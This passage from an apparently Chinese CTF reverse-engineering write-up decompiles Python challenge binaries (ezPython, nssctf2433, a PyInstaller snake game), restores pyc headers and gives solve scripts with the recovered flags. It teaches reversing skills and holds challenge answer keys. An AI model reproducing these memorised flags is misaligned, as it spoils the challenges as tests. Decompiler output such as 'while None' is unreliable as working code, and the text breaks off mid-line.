rsa.<span class="hljs-built_in">encrypt</span>(message.<span class="hljs-built_in">encode</span>(), key2)<br>    return crypto_text<br><br><br>def <span class="hljs-built_in">decrypt1</span>(message):<br>    message_str = rsa.<span class="hljs-built_in">decrypt</span>(message, key1).<span class="hljs-built_in">decode</span>()<br>    return message_str<br><br><br>def <span class="hljs-built_in">encrypt2</span>(tips, key):<br>    ltips = <span class="hljs-built_in">len</span>(tips)<br>    lkey = <span class="hljs-built_in">len</span>(key)<br>    secret = []<br>    num = <span class="hljs-number">0</span><br>    for each in tips:<br>        if num &gt;= lkey:<br>            num = num % lkey<br>        secret.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(each) ^ <span class="hljs-built_in">ord</span>(key[num])))<br>        num += <span class="hljs-number">1</span><br><br>    return base64.<span class="hljs-built_in">b64encode</span>(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>(secret).<span class="hljs-built_in">encode</span>()).<span class="hljs-built_in">decode</span>()<br><br><br>def <span class="hljs-built_in">decrypt2</span>(secret, key):<br>    tips = base64.<span class="hljs-built_in">b64decode</span>(secret.<span class="hljs-built_in">encode</span>()).<span class="hljs-built_in">decode</span>()<br>    ltips = <span class="hljs-built_in">len</span>(tips)<br>    lkey = <span class="hljs-built_in">len</span>(key)<br>    secret = []<br>    num = <span class="hljs-number">0</span><br>    for each in tips:<br>        if num &gt;= lkey:<br>            num = num % lkey<br>        secret.<span class="hljs-built_in">append</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(each) ^ <span class="hljs-built_in">ord</span>(key[num])))<br>        num += <span class="hljs-number">1</span><br><br>    return <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>(secret)<br><br><br>flag = <span class="hljs-string">&quot;IAMrG1EOPkM5NRI1cChQDxEcGDZMURptPzgHJHUiN0ASDgUYUB4LGQMUGAtLCQcJJywcFmddNno/PBtQbiMWNxsGLiFuLwpiFlkyP084Ng0lKj8GUBMXcwEXPTJrRDMdNwMiHVkCBFklHgIAWQwgCz8YQhp6E1xUHgUELxMtSh0xXzxBEisbUyYGOx1DBBZWPg1CXFkvJEcxO0ADeBwzChIOQkdwXQRpQCJHCQsaFE4CIjMDcwswTBw4BS9mLVMLLDs8HVgeQkscGBEBFSpQFQQgPTVRAUpvHyAiV1oPE0kyADpDbF8AbyErBjNkPh9PHiY7O1ZaGBADMB0PEVwdCxI+MCcXARZiPhwfH1IfKitGOF42FV8FTxwqPzBPAVUUOAEKAHEEP2QZGjQVV1oIS0QBJgBDLx1jEAsWKGk5Nw03MVgmWSE4Qy5LEghoHDY+OQ9dXE44Th0=&quot;</span><br>key = <span class="hljs-string">&quot;this is key&quot;</span><br><br>result = <span class="hljs-built_in">decrypt2</span>(<span class="hljs-string">&quot;AAAAAAAAAAAfFwwRSAIWWQ==&quot;</span>, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">decrypt1</span>(base64.<span class="hljs-built_in">b64decode</span>(<span class="hljs-built_in">decrypt2</span>(flag, result))))<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721204088397-9f95592e-8761-47de-b20b-59c93854b61d.png"></h2><h2 id="2、字符与长整型的转换"><a href="#2、字符与长整型的转换" class="headerlink" title="2、字符与长整型的转换"></a>2、字符与长整型的转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.9.1</span><br><span class="hljs-comment"># Python bytecode version base 3.7.0 (3394)</span><br><span class="hljs-comment"># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: .\ezPython.py</span><br><span class="hljs-comment"># Compiled at: 2022-09-03 23:53:44</span><br><span class="hljs-comment"># Size of source mod 2**32: 444 bytes</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64, base58<br>password = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;password.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br>tmp = bytes_to_long(password.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>ans = base64.b64encode(base58.b58encode(<span class="hljs-built_in">str</span>(tmp))).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;ve forgot my password,could you please help me find the password?&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-string">&quot;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You get the password!&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong! try again&quot;</span>)<br><br><span class="hljs-comment"># okay decompiling ezPython.pyc</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import base64<br>import hashlib<br><br>import base58<br>from Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import long_to_bytes<br><br>flag = <span class="hljs-string">&quot;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==&quot;</span><br>flag = base64<span class="hljs-selector-class">.b64decode</span>(flag)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>flag = base58<span class="hljs-selector-class">.b58decode</span>(flag)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>flag = <span class="hljs-built_in">long_to_bytes</span>(<span class="hljs-built_in">int</span>(flag))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(flag)</span></span>)<br><span class="hljs-selector-id">#Plain</span> Text<br>flag = flag<span class="hljs-selector-class">.decode</span>()<br>#这⾥需要将值的类型从bytes转换成str<br>flag = hashlib<span class="hljs-selector-class">.md5</span>(flag<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag.hexdigest()</span></span>)<br></code></pre></td></tr></table></figure><p>简单的来叙述一下这个exp。<br>首先因为他加密的时候是先套base58再套base64，所以我们解密的时候就要先解开base64再解base58。因为他在加密base58的时候有转换数据类型为str（字符串）。所以我们在解密base58的时候要转换数据类型为int（整数）。<br>第一步做完了。<br>第二步因为他在加密的时候使用了字节型转长整型。<br>所以我们解密的时候就要反过来把长整型转换成字节型。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">number</span> = <span class="hljs-number">22385992650816784030032474165</span><br><br><span class="hljs-meta"># 将整数转换为字节数组，使用大端（big-endian）字节序</span><br>number_bytes = <span class="hljs-built_in">number</span>.to_bytes((<span class="hljs-built_in">number</span>.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><br><span class="hljs-meta"># 将字节数组转换为字符串</span><br>number_str = number_bytes.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>)  <span class="hljs-meta"># 使用 latin1 编码确保每个字节直接映射到字符</span><br>print(number_str)<br></code></pre></td></tr></table></figure><p>其实这一步做完之后我们已经把整个程序都解析完毕得到了flag为：HUBUCTF@1405<br>但是题目要求我们的最终flag还要进行一层md5加密。<br>所以我们得把HUBUCTF@1405进行md5加密一下，这里简单的方法可以使用在线网站直接加密。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721205736322-729d8d9f-3ee6-48bc-8a3e-5845c28de267.png"><br>或者就是用我exp里的办法python里的库函数进行python脚本里的md5加密。<br>最终的flag为：fd78ee3399dd6a3c1d0b637fdca0c075<br>最后这里附带上python脚本的运行结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721465966899-433764e6-e203-43ff-a7e7-d26be87ba859.png"></p><h2 id="3、nssctf2433"><a href="#3、nssctf2433" class="headerlink" title="3、nssctf2433"></a>3、nssctf2433</h2><p>前面还是正常的python逆向</p><p>得到python文件  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.9.1</span><br><span class="hljs-comment"># Python bytecode version base 3.7.0 (3394)</span><br><span class="hljs-comment"># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]</span><br><span class="hljs-comment"># Embedded file name: 1.py</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;plz input your flag:&quot;</span>)<br>    c = [<span class="hljs-number">144</span>, <span class="hljs-number">163</span>, <span class="hljs-number">158</span>, <span class="hljs-number">177</span>, <span class="hljs-number">121</span>, <span class="hljs-number">39</span>, <span class="hljs-number">58</span>, <span class="hljs-number">58</span>, <span class="hljs-number">91</span>, <span class="hljs-number">111</span>, <span class="hljs-number">25</span>, <span class="hljs-number">158</span>, <span class="hljs-number">72</span>, <span class="hljs-number">53</span>, <span class="hljs-number">152</span>, <br>     <span class="hljs-number">78</span>, <span class="hljs-number">171</span>, <span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">105</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">12</span>, <span class="hljs-number">171</span>, <span class="hljs-number">111</span>, <span class="hljs-number">91</span>, <span class="hljs-number">53</span>, <br>     <span class="hljs-number">152</span>, <span class="hljs-number">105</span>, <span class="hljs-number">45</span>, <span class="hljs-number">152</span>, <span class="hljs-number">144</span>, <span class="hljs-number">39</span>, <span class="hljs-number">171</span>, <span class="hljs-number">45</span>, <span class="hljs-number">91</span>, <span class="hljs-number">78</span>, <span class="hljs-number">45</span>, <span class="hljs-number">158</span>, <span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) != <span class="hljs-number">42</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong length&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    b = <span class="hljs-number">179</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(a[i]) * <span class="hljs-number">33</span> % b != c[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win&quot;</span>)<br><br><br>check()<br><br><span class="hljs-comment"># okay decompiling 1.pyc</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">c = [<span class="hljs-number">144</span>, <span class="hljs-number">163</span>, <span class="hljs-number">158</span>, <span class="hljs-number">177</span>, <span class="hljs-number">121</span>, <span class="hljs-number">39</span>, <span class="hljs-number">58</span>, <span class="hljs-number">58</span>, <span class="hljs-number">91</span>, <span class="hljs-number">111</span>, <span class="hljs-number">25</span>, <span class="hljs-number">158</span>, <span class="hljs-number">72</span>, <span class="hljs-number">53</span>, <span class="hljs-number">152</span>,<br>     <span class="hljs-number">78</span>, <span class="hljs-number">171</span>, <span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">105</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">12</span>, <span class="hljs-number">171</span>, <span class="hljs-number">111</span>, <span class="hljs-number">91</span>, <span class="hljs-number">53</span>,<br>     <span class="hljs-number">152</span>, <span class="hljs-number">105</span>, <span class="hljs-number">45</span>, <span class="hljs-number">152</span>, <span class="hljs-number">144</span>, <span class="hljs-number">39</span>, <span class="hljs-number">171</span>, <span class="hljs-number">45</span>, <span class="hljs-number">91</span>, <span class="hljs-number">78</span>, <span class="hljs-number">45</span>, <span class="hljs-number">158</span>, <span class="hljs-number">8</span>]<br>b = <span class="hljs-number">179</span><br><span class="hljs-keyword">a</span> = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(c)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):<br>        temp=c[i]+j*b<br>        <span class="hljs-built_in">num</span> = chr((c[i] + j * b)<span class="hljs-comment"> // 33)</span><br>        <span class="hljs-keyword">if</span> (ord(<span class="hljs-built_in">num</span>) &gt;= <span class="hljs-number">33</span> <span class="hljs-keyword">and</span> ord(<span class="hljs-built_in">num</span>) &lt;= <span class="hljs-number">127</span> <span class="hljs-keyword">and</span> temp%<span class="hljs-number">33</span>==<span class="hljs-number">0</span>):<br>            <span class="hljs-keyword">a</span> += <span class="hljs-built_in">num</span><br>            break<br><br>print(<span class="hljs-keyword">a</span>)<br></code></pre></td></tr></table></figure><h2 id="Python逆向基本操作步骤详解——以杭电新生赛hgame-week2-reverse-stream-python3-10逆向-为例-CSDN博客magic-number"><a href="#Python逆向基本操作步骤详解——以杭电新生赛hgame-week2-reverse-stream-python3-10逆向-为例-CSDN博客magic-number" class="headerlink" title="Python逆向基本操作步骤详解——以杭电新生赛hgame week2 reverse stream(python3.10逆向)为例-CSDN博客magic number"></a><a href="https://blog.csdn.net/OrientalGlass/article/details/128693889?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240978816800172528432%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172240978816800172528432&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-128693889-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=python%E9%80%86%E5%90%91&spm=1018.2226.3001.4187">Python逆向基本操作步骤详解——以杭电新生赛hgame week2 reverse stream(python3.10逆向)为例-CSDN博客</a>magic number</h2><h1 id="3-8以下用compyle6"><a href="#3-8以下用compyle6" class="headerlink" title="3.8以下用compyle6"></a>3.8以下用compyle6</h1><h1 id="例题（修改文件头）"><a href="#例题（修改文件头）" class="headerlink" title="例题（修改文件头）"></a>例题（修改文件头）</h1><p>先对pyc反编译</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721375296137-1dcae075-511c-4705-b4ac-d60ec5412877.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721375274170-2bef2aad-83cb-4853-a4d3-5a7c36600af9.png"></p><p>使用010工具把struct的头八字节替换到1.pyc的最上面，为什么要替换？<br>因为用 PyInstaller 打包后，pyc 文件的前 8 个字节会被抹掉，所以最后要自己添加回去。前四个字节为 python 编译的版本，后四个字节为时间戳。想要获得编译版本可以查看打包文件里 struct 的信息，我这里还是提取出 struct 这个文件，有 struct 作为对照就方便多了，不用特定下载对应版本的 python 来生成特定的 pyc 文件来取前 8 个字节：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721376932445-1134c14c-e8b1-4077-ae92-4fe0faab542f.png"></p><p>然后save，用在线的py反编译一下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721379221167-29daf804-bc14-4573-846d-93f3d344aeb2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.7</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;贪吃蛇&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pygame<br><span class="hljs-keyword">from</span> pygame.<span class="hljs-built_in">locals</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br>SCREEN_WIDTH = <span class="hljs-number">600</span><br>SCREEN_HEIGHT = <span class="hljs-number">480</span><br>SIZE = <span class="hljs-number">20</span><br>LINE_WIDTH = <span class="hljs-number">1</span><br>SCOPE_X = (<span class="hljs-number">0</span>, SCREEN_WIDTH // SIZE - <span class="hljs-number">1</span>)<br>SCOPE_Y = (<span class="hljs-number">2</span>, SCREEN_HEIGHT // SIZE - <span class="hljs-number">1</span>)<br>FOOD_STYLE_LIST = [<br>    (<span class="hljs-number">10</span>, (<span class="hljs-number">255</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>)),<br>    (<span class="hljs-number">20</span>, (<span class="hljs-number">100</span>, <span class="hljs-number">255</span>, <span class="hljs-number">100</span>)),<br>    (<span class="hljs-number">30</span>, (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">255</span>))]<br>LIGHT = (<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">100</span>)<br>DARK = (<span class="hljs-number">200</span>, <span class="hljs-number">200</span>, <span class="hljs-number">200</span>)<br>BLACK = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>RED = (<span class="hljs-number">200</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>)<br>BGCOLOR = (<span class="hljs-number">40</span>, <span class="hljs-number">40</span>, <span class="hljs-number">60</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_text</span>(<span class="hljs-params">screen, font, x, y, text, fcolor=(<span class="hljs-params">(<span class="hljs-params"><span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span></span>),</span>)</span>):<br>    imgText = font.render(text, <span class="hljs-literal">True</span>, fcolor)<br>    screen.blit(imgText, (x, y))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_snake</span>():<br>    snake = deque()<br>    snake.append((<span class="hljs-number">2</span>, SCOPE_Y[<span class="hljs-number">0</span>]))<br>    snake.append((<span class="hljs-number">1</span>, SCOPE_Y[<span class="hljs-number">0</span>]))<br>    snake.append((<span class="hljs-number">0</span>, SCOPE_Y[<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">return</span> snake<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_food</span>(<span class="hljs-params">snake</span>):<br>    food_x = random.randint(SCOPE_X[<span class="hljs-number">0</span>], SCOPE_X[<span class="hljs-number">1</span>])<br>    food_y = random.randint(SCOPE_Y[<span class="hljs-number">0</span>], SCOPE_Y[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">while</span> (food_x, food_y) <span class="hljs-keyword">in</span> snake:<br>        food_x = random.randint(SCOPE_X[<span class="hljs-number">0</span>], SCOPE_X[<span class="hljs-number">1</span>])<br>        food_y = random.randint(SCOPE_Y[<span class="hljs-number">0</span>], SCOPE_Y[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> (food_x, food_y)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_food_style</span>():<br>    <span class="hljs-keyword">return</span> FOOD_STYLE_LIST[random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    pygame.init()<br>    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))<br>    pygame.display.set_caption(<span class="hljs-string">&#x27;贪吃蛇&#x27;</span>)<br>    font1 = pygame.font.SysFont(<span class="hljs-string">&#x27;SimHei&#x27;</span>, <span class="hljs-number">24</span>)<br>    font2 = pygame.font.Font(<span class="hljs-literal">None</span>, <span class="hljs-number">72</span>)<br>    (fwidth, fheight) = font2.size(<span class="hljs-string">&#x27;GAME OVER&#x27;</span>)<br>    b = <span class="hljs-literal">True</span><br>    snake = init_snake()<br>    food = create_food(snake)<br>    food_style = get_food_style()<br>    pos = (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    game_over = <span class="hljs-literal">True</span><br>    start = <span class="hljs-literal">False</span><br>    score = <span class="hljs-number">0</span><br>    orispeed = <span class="hljs-number">0.5</span><br>    speed = orispeed<br>    last_move_time = <span class="hljs-literal">None</span><br>    pause = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == QUIT:<br>                sys.exit()<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == KEYDOWN <span class="hljs-keyword">or</span> event.key == K_RETURN <span class="hljs-keyword">or</span> game_over:<br>                start = <span class="hljs-literal">True</span><br>                game_over = <span class="hljs-literal">False</span><br>                b = <span class="hljs-literal">True</span><br>                snake = init_snake()<br>                food = create_food(snake)<br>                food_style = get_food_style()<br>                pos = (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>                score = <span class="hljs-number">0</span><br>                last_move_time = time.time()<br>                <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event.key == K_SPACE <span class="hljs-keyword">or</span> game_over:<br>                    pause = <span class="hljs-keyword">not</span> pause<br>                    <span class="hljs-keyword">continue</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (event.key <span class="hljs-keyword">in</span> (K_w, K_UP) <span class="hljs-keyword">or</span> b) <span class="hljs-keyword">and</span> pos[<span class="hljs-number">1</span>]:<br>                        pos = (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>)<br>                        b = <span class="hljs-literal">False</span><br>                        <span class="hljs-keyword">continue</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (event.key <span class="hljs-keyword">in</span> (K_s, K_DOWN) <span class="hljs-keyword">or</span> b) <span class="hljs-keyword">and</span> pos[<span class="hljs-number">1</span>]:<br>                            pos = (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>                            b = <span class="hljs-literal">False</span><br>                            <span class="hljs-keyword">continue</span><br>                            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (event.key <span class="hljs-keyword">in</span> (K_a, K_LEFT) <span class="hljs-keyword">or</span> b) <span class="hljs-keyword">and</span> pos[<span class="hljs-number">0</span>]:<br>                                pos = (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>                                b = <span class="hljs-literal">False</span><br>                                <span class="hljs-keyword">continue</span><br>                                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event.key <span class="hljs-keyword">in</span> (K_d, K_RIGHT) <span class="hljs-keyword">and</span> b <span class="hljs-keyword">and</span> pos[<span class="hljs-number">0</span>]:<br>                                    pos = (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>                                    b = <span class="hljs-literal">False</span><br>                                screen.fill(BGCOLOR)<br>                                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(SIZE, SCREEN_WIDTH, SIZE):<br>                                    pygame.draw.line(screen, BLACK, (x, SCOPE_Y[<span class="hljs-number">0</span>] * SIZE), (x, SCREEN_HEIGHT),<br>                                                     LINE_WIDTH)<br><br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(SCOPE_Y[<span class="hljs-number">0</span>] * SIZE, SCREEN_HEIGHT, SIZE):<br>            pygame.draw.line(screen, BLACK, (<span class="hljs-number">0</span>, y), (SCREEN_WIDTH, 